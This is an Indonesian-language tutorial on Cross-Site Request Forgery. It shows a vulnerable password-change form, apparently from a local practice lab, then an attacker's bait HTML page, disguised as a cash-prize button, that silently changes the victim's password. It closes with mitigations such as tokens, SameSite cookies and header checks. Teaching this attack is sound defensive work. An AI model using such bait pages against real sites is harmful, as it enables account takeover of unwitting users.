# Cross-Site Request Forgery

## Definisi

CSRF (Cross-Site Request Forgery) adalah jenis kerentanan pada aplikasi web di mana penyerang dapat mengeksploitasi kepercayaan yang diberikan pengguna kepada suatu situs web. Dalam serangan CSRF, penyerang memanipulasi pengguna yang sedang diautentikasi (login) di situs web target untuk melakukan tindakan yang tidak disengaja tanpa sepengetahuan atau persetujuan mereka.

![csrf](https://media.geeksforgeeks.org/wp-content/uploads/20220330113139/csrf.jpg)

Serangan ini dapat terjadi karena browser secara otomatis mengirimkan dan menyertakan _session cookie_ pada setiap request yang dikirim ke suatu domain, termasuk ketika request tersebut dibuat dari halaman milik situs lain (cross-site).

## Contoh Serangan

Terdapat website sederhana dengan fitur pengganti akun pw.

![contoh](images/image.png)

```html
<form action="#" method="GET">
    New password:<br />
    <input type="password" AUTOCOMPLETE="off" name="password_new"><br />
    Confirm new password:<br />
    <input type="password" AUTOCOMPLETE="off" name="password_conf"><br />
    <br />
    <input type="submit" value="Change" name="Change">
</form>
```
Dapat dilihat tidak ada "CSRF-Token" sebagai proses verifikasi pada setiap request, maka dapat dibuat sebuah website sebagai **bait**.

potongan kode yang disembunyikan oleh penyerang, dapat berupa popup menu iklan atau tombol dengan link aneh

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Klik Dapat Uang Coy!!</title>
</head>
<body>
    <form action="http://localhost/vulnerabilities/csrf/?" method="GET">
        <input type="hidden" name="password_new" value="Password-Hacked-Attacker">
        <input type="hidden" name="password_conf" value="Password-Hacked-Attacker">
        <input type="hidden" name="Change" value="Change">
        <input type="submit" value="Klik Langsung Dapat UANG!!!">
    </form>
</body>
</html>
```

Website yang dibuat penyerang tujuannya adalah mengelabuhi korban, agar melakukan eksekusi request yang tidak diinginkan.
Kalau dalam contoh diatas, penyerang akan menyamarkan halaman bait nya menjadi berupa popup iklan, tombol undian, atau tautan menarik lainnya agar korban dapat meng-klik tombol submit.

## Mitigasi

1. Menambahkan CSRF Token unik dan acak untuk setiap request atau sesi
2. Validasi Header dengan memeriksa header `Origin` atau `Referer` untuk setiap request yang bersifat sensitif
3. Mengatur cookie dengan atribut `SameSite` untuk membatasi bahwa request dibuat dalam situs yang sama dan browser tidak akan menyertakan cookie tersebut jika di request dari situs lain (cross-site)
4. Menggunakan metode HTTP yang sesuai untuk melakukan perubahan state pada aplikasi maupun data

## Referensi

1. https://portswigger.net/web-security/csrf
2. https://owasp.org/www-community/attacks/csrf
